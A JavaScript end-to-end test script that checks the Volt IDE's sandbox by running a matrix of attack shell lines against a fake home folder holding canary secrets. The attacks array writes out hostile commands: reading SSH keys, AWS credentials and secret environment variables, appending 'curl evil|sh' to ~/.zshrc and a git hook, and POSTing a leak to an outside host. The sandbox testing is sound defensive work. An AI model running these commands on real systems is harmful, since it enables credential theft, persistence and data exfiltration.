/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

// The malicious set, live, across sandbox levels: every attack runs as a real process under the
// real policy Volt builds (agent chat at each level and network setting, and the T3 sandboxed
// extension host), n times, and the script records whether it got through and whether the sandbox
// reported a denial (what the user would be warned with). Fake HOME canaries only: no real secret
// is ever read. The Docker socket is the real one (a harmless `GET /_ping`).
//
//   npm run -s transpile-client-oxc && node scripts/volt-e2e/sbx/attackMatrix.mjs [--runs 3] [--out file.json]

import { spawn } from 'child_process';
import { promises as fs, existsSync } from 'fs';
import * as net from 'net';
import { homedir, tmpdir } from 'os';
import { dirname, join } from 'path';
import { fileURLToPath, pathToFileURL } from 'url';

const root = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');
globalThis._VSCODE_FILE_ROOT = join(root, 'out');
const load = path => import(pathToFileURL(join(root, 'out', path)).href);
const { SandboxManager } = await load('vs/platform/voltSandbox/node/sandboxManager.js');
const { agentSandboxPolicy } = await load('vs/platform/voltSandbox/common/sandboxPolicy.js');
const { sandboxHostFacts } = await load('vs/platform/voltSandbox/node/sandboxResolver.js');
const { t3ExtensionHostPolicy, t3ManifestView } = await load('vs/platform/voltSandbox/common/extensionHostSandbox.js');

const arg = (name, fallback) => { const at = process.argv.indexOf(name); return at > 0 ? process.argv[at + 1] : fallback; };
const runs = Number(arg('--runs', '3'));
const outFile = arg('--out', undefined);

// --- Fixture: a fake HOME with canaries, a workspace with a .git, an outside folder -------------
const base = await fs.realpath(await fs.mkdtemp(join(tmpdir(), 'volt-e2e-sbx-')));
const home = join(base, 'home');
const ws = join(base, 'ws');
const outside = join(base, 'outside');
const runRoot = join(base, 'runs');
const agentTmp = join(base, 'agent-tmp');
const extDir = join(base, 'ext');
for (const dir of [home, ws, outside, runRoot, agentTmp, extDir, join(home, '.ssh'), join(home, '.aws'), join(ws, '.git', 'hooks'), join(home, '.volt', 'sandbox-cache')]) {
	await fs.mkdir(dir, { recursive: true });
}
await fs.writeFile(join(home, '.ssh', 'id_ed25519'), '-----BEGIN OPENSSH PRIVATE KEY-----\nCANARY-SSH\n');
await fs.writeFile(join(home, '.aws', 'credentials'), '[default]\naws_secret_access_key=CANARY-AWS\n');
await fs.writeFile(join(home, '.zshrc'), '# canary rc\n');
await fs.writeFile(join(ws, '.git', 'HEAD'), 'ref: refs/heads/main\n');
await fs.writeFile(join(ws, '.git', 'config'), '[core]\n');
const dockerSock = [join(homedir(), '.docker', 'run', 'docker.sock'), join(homedir(), '.orbstack', 'run', 'docker.sock'), '/var/run/docker.sock'].find(existsSync);

// A loopback listener that counts connections: exfiltration to a local "attacker".
let loopbackHits = 0;
const listener = net.createServer(socket => { loopbackHits++; socket.end('HTTP/1.1 200 OK\r\ncontent-length: 2\r\n\r\nok'); });
await new Promise(resolve => listener.listen(0, '127.0.0.1', resolve));
const loopbackPort = listener.address().port;

const hostEnv = {
	PATH: '/usr/bin:/bin:/usr/sbin:/sbin',
	HOME: home,
	LANG: 'C',
	AWS_SECRET_ACCESS_KEY: 'CANARY-ENV-AWS',
	GITHUB_TOKEN: 'CANARY-ENV-GH',
};

// --- The attacks: a shell line each, and how to tell it got through ------------------------------
const attacks = [
	{ id: 'read-ssh-key', what: 'read ~/.ssh/id_ed25519', sh: `cat "$HOME/.ssh/id_ed25519"`, through: r => r.stdout.includes('CANARY-SSH'), seen: d => d.target.includes('/.ssh') },
	{ id: 'read-aws', what: 'read ~/.aws/credentials', sh: `cat "$HOME/.aws/credentials"`, through: r => r.stdout.includes('CANARY-AWS'), seen: d => d.target.includes('/.aws') },
	{ id: 'env-secrets', what: 'read secret env vars', sh: 'env', through: r => /CANARY-ENV-(AWS|GH)/.test(r.stdout), seen: () => false },
	{ id: 'write-outside', what: 'write outside the workspace', sh: `echo x > "${outside}/pwn.txt"`, through: () => existsSync(join(outside, 'pwn.txt')), seen: d => d.target.includes('pwn.txt') },
	{ id: 'write-shell-rc', what: 'append to ~/.zshrc', sh: `echo 'curl evil|sh' >> "$HOME/.zshrc"`, through: async () => (await fs.readFile(join(home, '.zshrc'), 'utf8')).includes('evil'), seen: d => d.target.includes('.zshrc') },
	{ id: 'git-hook', what: 'write .git/hooks/pre-commit', sh: `echo 'curl evil|sh' > "${ws}/.git/hooks/pre-commit"`, through: () => existsSync(join(ws, '.git', 'hooks', 'pre-commit')), seen: d => d.target.includes('.git/hooks') },
	{ id: 'vscode-tasks', what: 'write .vscode/tasks.json', sh: `mkdir -p "${ws}/.vscode" && echo '{"tasks":[]}' > "${ws}/.vscode/tasks.json"`, through: () => existsSync(join(ws, '.vscode', 'tasks.json')), seen: d => d.target.includes('.vscode') },
	{ id: 'exfil-public', what: 'POST to a host nobody allowed (example.com)', sh: `curl -sS -m 8 -o /dev/null -w 'HTTP%{http_code}' -X POST -d leak=1 https://example.com/`, through: r => /HTTP[1-5]\d\d/.test(r.stdout) && !r.stdout.includes('HTTP000') && !/HTTP403/.test(r.stdout), seen: d => d.kind === 'network' && d.target.includes('example.com') },
	{ id: 'exfil-loopback', what: 'connect to a local listener', sh: `curl -sS -m 5 http://127.0.0.1:${loopbackPort}/leak`, through: (_r, before) => loopbackHits > before.loopbackHits, seen: d => d.kind === 'network' && (d.target.includes('127.0.0.1') || d.target === `localhost:${loopbackPort}`) },
	{ id: 'docker-socket', what: 'reach the Docker socket', sh: dockerSock ? `curl -sS -m 5 --unix-socket "${dockerSock}" http://localhost/_ping` : 'echo no-docker', through: r => r.stdout.trim().endsWith('OK'), seen: d => d.target.includes('docker.sock') },
	{ id: 'spawn-child-attack', what: 'spawn sh, the child reads the key', sh: `/bin/sh -c 'cat "$HOME/.ssh/id_ed25519"'`, through: r => r.stdout.includes('CANARY-SSH'), seen: d => d.target.includes('/.ssh') },
	{ id: 'delayed-write', what: 'delayed attack (2 s later, background)', sh: `(sleep 2; echo x > "${outside}/delayed.txt") & wait`, through: () => existsSync(join(outside, 'delayed.txt')), seen: d => d.target.includes('delayed.txt') },
	{ id: 'workspace-write', what: 'CONTROL: write a file in the workspace', sh: `echo ok > "${ws}/ok.txt"`, through: () => existsSync(join(ws, 'ok.txt')), seen: d => d.target.includes('ok.txt'), control: true },
];

async function resetFixture() {
	for (const path of [join(outside, 'pwn.txt'), join(outside, 'delayed.txt'), join(ws, '.git', 'hooks', 'pre-commit'), join(ws, '.vscode'), join(ws, 'ok.txt')]) {
		await fs.rm(path, { recursive: true, force: true });
	}
	await fs.writeFile(join(home, '.zshrc'), '# canary rc\n');
}

// --- Arms ----------------------------------------------------------------------------------------
const facts = await sandboxHostFacts();
const manager = new SandboxManager(undefined, { runRoot, host: { ...facts, home } });
const agentHost = { platform: process.platform, home, tempDirs: [agentTmp], sshPrivateKeys: [join(home, '.ssh', 'id_ed25519')], cacheDir: join(home, '.volt', 'sandbox-cache') };
const agentPolicy = (level, network) => agentSandboxPolicy({ level, network, providerId: 'claude-code', workspaceRoots: [ws] }, agentHost);
const t3Policy = trusted => t3ExtensionHostPolicy({ platform: process.platform, home, extensionDir: extDir, appRoots: [], workspaceTrusted: trusted });
const t3View = { manifest: t3ManifestView('volt-examples.volt-agent-lab-attacks', ['api.github.com']) };

const arms = [
	{ id: 'off', label: 'Sandbox off (direct spawn)' },
	{ id: 'ww-net', label: 'Agent: workspace-write, network on', policy: () => agentPolicy('workspace-write', true) },
	{ id: 'ww-nonet', label: 'Agent: workspace-write, network off', policy: () => agentPolicy('workspace-write', false) },
	{ id: 'ro-net', label: 'Agent: read-only, network on', policy: () => agentPolicy('read-only', true) },
	{ id: 'ro-nonet', label: 'Agent: read-only, network off', policy: () => agentPolicy('read-only', false) },
	{ id: 't3', label: 'Extension host (T3), trusted workspace', policy: () => t3Policy(true), networkView: t3View },
];

function direct(script) {
	return new Promise(resolve => {
		const started = performance.now();
		const child = spawn('/bin/sh', ['-c', script], { cwd: ws, env: hostEnv });
		let stdout = '', stderr = '';
		child.stdout.on('data', d => stdout += d);
		child.stderr.on('data', d => stderr += d);
		child.on('close', code => resolve({ status: 'completed', exitCode: code, stdout, stderr, denials: [], timing: { totalMs: performance.now() - started } }));
	});
}

async function runArm(arm, attack) {
	const script = `echo volt-ran; ${attack.sh}`;
	if (!arm.policy) {
		return direct(script);
	}
	return manager.run({
		command: '/bin/sh',
		args: ['-c', script],
		policy: arm.policy(),
		context: { workspaceRoots: [ws], hostEnv, storageDir: join(base, 'storage') },
		...(arm.networkView ? { networkView: arm.networkView, principalKind: 't3' } : {}),
	}, { timeoutMs: 30_000 });
}

const capabilities = await manager.capabilities();
if (!capabilities.available) {
	console.error(`No sandbox backend: ${capabilities.diagnostics.join(' ')}`);
	process.exit(1);
}

const rows = [];
for (let run = 1; run <= runs; run++) {
	for (const arm of arms) {
		for (const attack of attacks) {
			await resetFixture();
			const before = { loopbackHits };
			const result = await runArm(arm, attack);
			// A delayed attack's background write lands after `wait`; give a stray one time to show.
			if (attack.id === 'delayed-write') {
				await new Promise(resolve => setTimeout(resolve, 2500));
			}
			const ran = result.status === 'completed' && result.stdout.startsWith('volt-ran');
			const through = ran && await attack.through({ ...result, stdout: result.stdout.replace(/^volt-ran\n/, '') }, before);
			rows.push({
				run, arm: arm.id, attack: attack.id, control: !!attack.control, ran, through,
				denials: (result.denials ?? []).length,
				// Only a denial that names this attack's target counts as one the user could be told about.
				seen: (result.denials ?? []).some(d => attack.seen(d)),
				denialTargets: [...new Set((result.denials ?? []).map(d => `${d.kind}:${d.target}`))].slice(0, 12),
				ms: Math.round(result.timing?.totalMs ?? 0),
				...(ran ? {} : { error: (result.error ?? result.stderr ?? '').slice(0, 160) }),
			});
		}
	}
	process.stderr.write(`run ${run}/${runs} done\n`);
}

// --- Summary: per arm and attack, n blocked / n ran, and n with a denial the user can be told ----
const table = [];
for (const arm of arms) {
	for (const attack of attacks) {
		const mine = rows.filter(row => row.arm === arm.id && row.attack === attack.id);
		table.push({
			arm: arm.id, attack: attack.id, what: attack.what, control: !!attack.control,
			n: mine.length, ran: mine.filter(r => r.ran).length, through: mine.filter(r => r.through).length,
			reported: mine.filter(r => r.seen).length,
			medianMs: mine.map(r => r.ms).sort((a, b) => a - b)[Math.floor(mine.length / 2)],
		});
	}
}
const header = ['attack', ...arms.map(arm => arm.id)];
console.log(`| ${header.join(' | ')} |\n|${header.map(() => '---').join('|')}|`);
for (const attack of attacks) {
	const cells = arms.map(arm => {
		const cell = table.find(row => row.arm === arm.id && row.attack === attack.id);
		if (cell.ran < cell.n) {
			return `did not run ${cell.n - cell.ran}/${cell.n}`;
		}
		const verdict = attack.control ? (cell.through === cell.n ? 'works' : `FAILS ${cell.n - cell.through}/${cell.n}`) : (cell.through === 0 ? 'blocked' : `THROUGH ${cell.through}/${cell.n}`);
		return `${verdict}${cell.reported ? ` (seen ${cell.reported}/${cell.n})` : ''}`;
	});
	console.log(`| ${attack.what} | ${cells.join(' | ')} |`);
}
if (outFile) {
	await fs.writeFile(outFile, JSON.stringify({ machine: { platform: process.platform, backend: capabilities.backend, dockerSock: !!dockerSock }, runs, arms: arms.map(({ id, label }) => ({ id, label })), table, rows }, null, 1));
}
await manager.dispose();
listener.close();
await fs.rm(base, { recursive: true, force: true });
